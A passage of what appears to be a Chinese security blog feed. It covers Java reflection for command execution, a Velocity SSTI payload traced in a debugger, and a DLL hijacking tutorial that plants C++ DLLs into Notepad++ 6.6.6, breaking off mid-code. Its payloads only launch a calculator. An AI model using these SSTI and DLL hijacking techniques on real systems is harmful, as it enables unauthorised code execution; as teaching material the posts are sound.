class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">获取到Class对象之后，可以通过反射机制获取到对象的信息。</span><br><span class="line"></span><br><span class="line">## Java反射相关方法</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;java</span><br><span class="line">public Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)  &#x2F;&#x2F;获得该类所有的方法，不包括父类</span><br><span class="line">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)&#x2F;&#x2F;获得该类所有public的方法，包括父类。第一二个参数可以指定特定的方法，比如exec(String)和exec(String[])，通过第一个参数指定exec，第二个参数指定String 或者String[] 可以定位不同的方法。</span><br><span class="line">public Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)&#x2F;&#x2F;获得该类所有的构造方法</span><br><span class="line">public Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes)&#x2F;&#x2F;获得该类所有的public构造方法 包括父类</span><br><span class="line">public Field getDeclaredField(String name)&#x2F;&#x2F;获得该类所有的声明变量，不包括父类</span><br><span class="line">public Field getField(String name)&#x2F;&#x2F;获得该类所有的public声明变量，包括父类</span><br><span class="line">writeObject（）&#x2F;&#x2F;序列化，将Object输出成Byte流</span><br><span class="line">readObject（）&#x2F;&#x2F;反序列化，将Byte流输出成Object</span><br><span class="line">invoke()</span><br></pre></td></tr></table></figure></li></ol><p>invoke()的作用是执行(call)方法，正常的方法调用顺序为 <strong>object.method(p1,p2,p3)</strong></p><p>使用invoke的调用顺序为<strong>method.invoke(object,p1,p2,p3)</strong></p><p>getMethod方法重载：通过指定方法名和方法参数类型确定唯一一个方法。<img src="http://cdn.polowong.top/image-20220307234218733.png" alt="image-20220307234218733"></p><h2 id="java-单例模式"><a href="#java-单例模式" class="headerlink" title="java 单例模式"></a>java 单例模式</h2><p>Runtime的构造器是私有的，所以不可以直接new一个Runtime的对象。</p><p>这里搬运下runoob的介绍：</p><p>单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。</p><p>这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。</p><p><strong>注意：</strong></p><ul><li>1、单例类只能有一个实例。</li><li>2、单例类必须自己创建自己的唯一实例。</li><li>3、单例类必须给所有其他对象提供这一实例。</li></ul><p>个人理解单例模式就是一个类只有一个实例化对象在类内部，需要的时候就调用，全局仅维护这一个实例化对象，调用的时候没有就创建，有就返回实例化对象。这个实例化对象有的话只能有一个。</p><p>示例一：</p><p>Runtime的构造器属性为私有是有原因的，这是一种”单例模式”，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连<br>接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来获取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainDB</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> TrainDB instance = <span class="keyword">new</span> TrainDB();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">TrainDB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    db.conn();</span><br><span class="line"><span class="comment">// 建立连接的代码...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例二：</p><p>创建一个 Singleton 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleObject</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//创建 SingleObject 的一个对象</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> SingleObject instance = <span class="keyword">new</span> SingleObject();</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//让构造函数为 private，这样该类就不会被实例化</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="title">SingleObject</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//获取唯一可用的对象</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingleObject <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> instance;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从 singleton 类获取唯一的对象。\</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonPatternDemo</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//不合法的构造函数</span></span><br><span class="line">      <span class="comment">//编译时错误：构造函数 SingleObject() 是不可见的</span></span><br><span class="line">      <span class="comment">//SingleObject object = new SingleObject();</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取唯一可用的对象</span></span><br><span class="line">      SingleObject object = SingleObject.getInstance();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//显示消息</span></span><br><span class="line">      object.showMessage();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="java反射demo"><a href="#java反射demo" class="headerlink" title="java反射demo"></a>java反射demo</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//reflection demo 1</span></span><br><span class="line">        Class c2=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Object o1=c2.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        c2.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(o1,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>如果一个类的构造方法为私有，可以执行，不过需要一些操作：使用getDeclearedConstructor获取所有构造方法，设置可访问标记为true即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//reflection demo 2</span></span><br><span class="line">        Class c1=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Constructor cs=c1.getDeclaredConstructor();</span><br><span class="line">        cs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        c1.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(cs.newInstance(),<span class="string">&quot;notepad&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="java反射rce-SSTI"><a href="#java反射rce-SSTI" class="headerlink" title="java反射rce-SSTI"></a>java反射rce-SSTI</h1><p>velocity ssti，参考链接<a href="https://samny.blog.csdn.net/article/details/104881477">https://samny.blog.csdn.net/article/details/104881477</a></p><p>具体模板语言不讲了，根据payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?template&#x3D;%23set($e&#x3D;&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;)</span><br></pre></td></tr></table></figure><p>直接debug</p><p><img src="http://cdn.polowong.top/image-20220307235823301.png" alt="image-20220307235823301"></p><p><img src="http://cdn.polowong.top/image-20220307235841610.png" alt="image-20220307235841610"></p><p>一步步跟踪，跟踪到<strong>evaluate</strong>方法发现将<strong>String</strong>类型的输入转为了<strong>Reader</strong>类型：<strong>Reader</strong>是一个抽象类，它是以字符为单位的输入流的公共父类。<img src="http://cdn.polowong.top/image-20220307235925388.png"></p><p>继续跟踪到<strong>parse</strong>方法</p><p><img src="http://cdn.polowong.top/image-20220308000025688.png" alt="image-20220308000025688"></p><p>继续跟<strong>parse</strong>方法</p><p><img src="http://cdn.polowong.top/image-20220308000210699.png" alt="image-20220308000210699"></p><p><img src="http://cdn.polowong.top/image-20220308000719740.png" alt="image-20220308000719740"></p><p>进入<strong>init</strong>方法后 继续跟，跟到<strong>render</strong>方法</p><p><img src="http://cdn.polowong.top/image-20220308001022402.png" alt="image-20220308001022402"></p><p><img src="http://cdn.polowong.top/image-20220308001238023.png" alt="image-20220308001238023"></p><p><img src="http://cdn.polowong.top/image-20220308001303577.png" alt="image-20220308001303577"></p><p>继续跟进去看<strong>render</strong>方法</p><p>跟到后面发现<strong>execute</strong>方法，像invoke的调用方法，继续跟进去看看</p><p><img src="http://cdn.polowong.top/image-20220308001522947.png" alt="image-20220308001522947"></p><p>又是一个<strong>execute</strong>方法，继续跟</p><p><img src="http://cdn.polowong.top/image-20220308001654919.png" alt="image-20220308001654919"></p><p>哈哈，终于找到了眼熟的<strong>getMethod</strong>和<strong>invoke</strong>方法</p><p><img src="http://cdn.polowong.top/image-20220308001749767.png" alt="image-20220308001749767"></p><p>这样循环走下去，接下来是runtime，Runtime.getruntime()，exec(“calc”)。</p><p><img src="http://cdn.polowong.top/image-20220308001902056.png" alt="image-20220308001902056"></p><p><img src="http://cdn.polowong.top/image-20220308001936027.png" alt="image-20220308001936027"></p><p>最终弹出来了计算器</p><p><img src="http://cdn.polowong.top/image-20220308002715772.png" alt="image-20220308002715772"><br>#参考链接</p><p><a href="https://samny.blog.csdn.net/article/details/104881477">https://samny.blog.csdn.net/article/details/104881477</a><br><a href="https://www.sec-in.com/article/307">https://www.sec-in.com/article/307</a><br><a href="https://le1a.gitee.io/posts/916c2e64/">https://le1a.gitee.io/posts/916c2e64/</a><br><a href="https://blog.csdn.net/m0_38103658/article/details/105482035">https://blog.csdn.net/m0_38103658/article/details/105482035</a><br><a href="https://cloud.tencent.com/developer/article/1607776">https://cloud.tencent.com/developer/article/1607776</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java执行系统命令&quot;&gt;&lt;a href=&quot;#Java执行系统命令&quot; class=&quot;headerlink&quot; title=&quot;Java执行系统命令&quot;&gt;&lt;/a&gt;Java执行系统命令&lt;/h1&gt;&lt;h2 id=&quot;cmd相关参数&quot;&gt;&lt;a href=&quot;#cmd相关参数&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DLL劫持基础及红队武器化</title>
    <link href="https://polosec.github.io/2022/03/01/DLL%E5%8A%AB%E6%8C%81%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%8C%96/"/>
    <id>https://polosec.github.io/2022/03/01/DLL%E5%8A%AB%E6%8C%81%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%8C%96/</id>
    <published>2022-03-01T14:36:40.000Z</published>
    <updated>2022-03-01T14:36:47.453Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是DLL"><a href="#什么是DLL" class="headerlink" title="什么是DLL"></a>什么是DLL</h1><blockquote><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p></blockquote><blockquote><p>DLL 是一个包含可由多个程序同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32 DLL 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现“打开”对话框。这有助于促进代码重用和内存的有效使用。</p></blockquote><h2 id="DLL加载顺序"><a href="#DLL加载顺序" class="headerlink" title="DLL加载顺序"></a>DLL加载顺序</h2><p>一、Windows XP SP2之前 Windows查找DLL的目录以及对应的顺序：</p><ol><li>进程对应的应用程序所在目录；</li><li>当前目录（Current Directory）；</li><li>系统目录（通过 GetSystemDirectory 获取）；</li><li>16位系统目录；</li><li>Windows目录（通过 GetWindowsDirectory 获取）；</li><li>PATH环境变量中的各个目录；</li></ol><p>例如：对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。</p><p>二、在Windows xp sp2之后</p><p>Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：</p><p>默认注册表为：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode，其键值为1</p><ol><li>进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</li><li>系统目录（即%windir%system32）；</li><li>16位系统目录（即%windir%system）；</li><li>Windows目录（即%windir%）；</li><li>当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</li><li>PATH环境变量中的各个目录；</li></ol><p>三、Windows7以上</p><p>系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：</p><p>计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</p><p><img src="http://cdn.polowong.top/image-20220228164016478.png" alt="image-20220228164016478"></p><p>那么最终Windows2003以上以及win7以上操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p><ol><li><p>进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</p></li><li><p>系统目录（即%windir%system32）；</p></li><li><p>16位系统目录（即%windir%system）；</p></li><li><p>Windows目录（即%windir%）；</p></li><li><p>当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</p></li><li><p>PATH环境变量中的各个目录</p><p><img src="http://cdn.polowong.top/image-20220228164254582.png" alt="image-20220228164254582"></p></li></ol><h2 id="DLL正常调用demo"><a href="#DLL正常调用demo" class="headerlink" title="DLL正常调用demo"></a>DLL正常调用demo</h2><h3 id="DLLdemo"><a href="#DLLdemo" class="headerlink" title="DLLdemo"></a>DLLdemo</h3><p>vs2019新建动态链接库模板项目</p><p>项目结构如下</p><p><img src="http://cdn.polowong.top/image-20220228164734371.png" alt="image-20220228164734371"></p><p>在dllmain.cpp中添加如下代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该dll的作用是在进程调用该dll时执行计算器</p><p>添加头文件test.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">msg</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p>__declspec(dllexport)用于Windows中的动态库中，声明导出函数msg供其它程序调用</p></blockquote><p>添加cpp文件实现msg方法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">msg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;This is msg function:-)&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用demo"><a href="#调用demo" class="headerlink" title="调用demo"></a>调用demo</h3><p>新建一个控制台项目</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="comment">//定义函数类DLLFUNC</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*DLLFUNC)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">    DLLFUNC GetDllfunc = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//指定需要加载的dll文件</span></span><br><span class="line">    HINSTANCE hinst = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;hijack.dll&quot;</span>);<span class="comment">//加载dll文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hinst != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//获取函数的位置</span></span><br><span class="line">        GetDllfunc = (DLLFUNC)<span class="built_in">GetProcAddress</span>(hinst, <span class="string">&quot;msg&quot;</span>);<span class="comment">//获取dll中的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (GetDllfunc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//运行msg函数</span></span><br><span class="line">        (*GetDllfunc)();<span class="comment">//调用dll中的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;Error!&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;end&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将consoleapplication 与dll文件放在同一目录，运行exe</p><p><img src="http://cdn.polowong.top/image-20220228165110704.png" alt="image-20220228165110704"></p><p>可以看到，根据代码逻辑调用了dll文件，弹出了计算器并且成功调用了msg方法</p><p><img src="http://cdn.polowong.top/image-20220228165149367.png" alt="image-20220228165149367"></p><h1 id="什么是DLL劫持"><a href="#什么是DLL劫持" class="headerlink" title="什么是DLL劫持"></a>什么是DLL劫持</h1><p>由上述的DLL加载顺序得知，如果某个程序需要的dll文件在程序根目录不存在，会继续向后寻找dll文件，那么我们手动编写一个dll文件至程序根目录并且将dll名称改为程序需要的那个缺少的dll文件，根据加载顺序会优先加载我们编写的dll文件，实现dll劫持的效果。dll劫持的目的是替换/劫持/新增 恶意dll文件实现代码执行。</p><p>由此可以引出几种dll劫持的形式：</p><ol><li>直接将恶意dll暴力替换掉正常dll，软件正常功能会受影响</li><li>将恶意dll作为中间人，转发调用正常dll的导出函数，同时加入额外的恶意操作</li><li>利用加载顺序的机制，让恶意dll先于正常dll加载</li><li>利用软件本身缺失的dll加载恶意dll</li><li>更改环境变量或是.exe.manifest/.exe.local文件实现dll重定向</li><li>如果利用低权限劫持的dll文件，会被高权限程序加载运行，就是一个权限提升漏洞</li></ol><h1 id="DLL劫持实例"><a href="#DLL劫持实例" class="headerlink" title="DLL劫持实例"></a>DLL劫持实例</h1><h2 id="劫持Notepad-不存在的DLL"><a href="#劫持Notepad-不存在的DLL" class="headerlink" title="劫持Notepad++不存在的DLL"></a>劫持Notepad++不存在的DLL</h2><p>一般可以使用processmonitor、process explorer查找可能存在dll劫持的进程</p><p>使用process monitor查找与notepad++相关的进程，注：notepad++不要用最新版，最新版修复了劫持漏洞，这里用的是6.6.6版本。</p><p>这里打开过后设置几个过滤条件，分别是进程名、路径以及结果</p><p><img src="http://cdn.polowong.top/image-20220228170217568.png" alt="image-20220228170217568"></p><p>然后这里找一个需要用到<code>loadlibrary</code>这个api的dll，这里找有这个api的原因是因为如果该dll的调用栈中存在有 **LoadLibrary(Ex)**，说明这个DLL是被进程所动态加载的。在这种利用场景下，伪造的DLL文件不需要存在任何导出函数即可被成功加载，即使加载后进程内部出错，也是在DLL被成功加载之后的事情。</p><p><img src="http://cdn.polowong.top/image-20220228170242843.png" alt="image-20220228170242843"></p><p>可以看到，Msimg32.dll文件是程序运行需要但是没找到的，所以我们可以写一个Msimg32.dll文件放到程序根目录实现动态恶意dll加载。</p><p>将刚才的dll hijack demo生成的dll文件放到notepad++的根目录并改名为Msimg32.dll，当再次打开notepad++.exe时即可完成劫持</p><p><img src="http://cdn.polowong.top/image-20220228170823499.png" alt="image-20220228170823499"></p><p><img src="http://cdn.polowong.top/image-20220228170839113.png" alt="image-20220228170839113"></p><h2 id="劫持Notepad-中存在的DLL"><a href="#劫持Notepad-中存在的DLL" class="headerlink" title="劫持Notepad++中存在的DLL"></a>劫持Notepad++中存在的DLL</h2><p>将procmon中NOT FOUND 的条件改为SUCCESS</p><p><img src="http://cdn.polowong.top/image-20220228172005462.png" alt="image-20220228172005462"></p><p><img src="http://cdn.polowong.top/image-20220228172024684.png" alt="image-20220228172024684"></p><p>发现存在loadLibraryEx，尝试劫持该dll</p><p>使用工具CFF explorer查看该DLL的输出函数，输出函数是可以被外部访问的，就像刚才写的demo一样</p><p><img src="http://cdn.polowong.top/image-20220228172552154.png" alt="image-20220228172552154"></p><p>编写dll文件内容如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">Scintilla_DirectFunction</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scintilla_DirectFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成DLL改名为SciLexer.dll并放到notepad++根目录并尝试运行</p><p><img src="http://cdn.polowong.top/image-20220228172839478.png" alt="image-20220228172839478"></p><p>发现报错了，感觉是dll中有些内容是必须实现的，但是我们不知道其内容是什么，所以考虑其他方法劫持该dll</p><p>下面使用dll转发的方式劫持该dll</p><p>dll文件代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 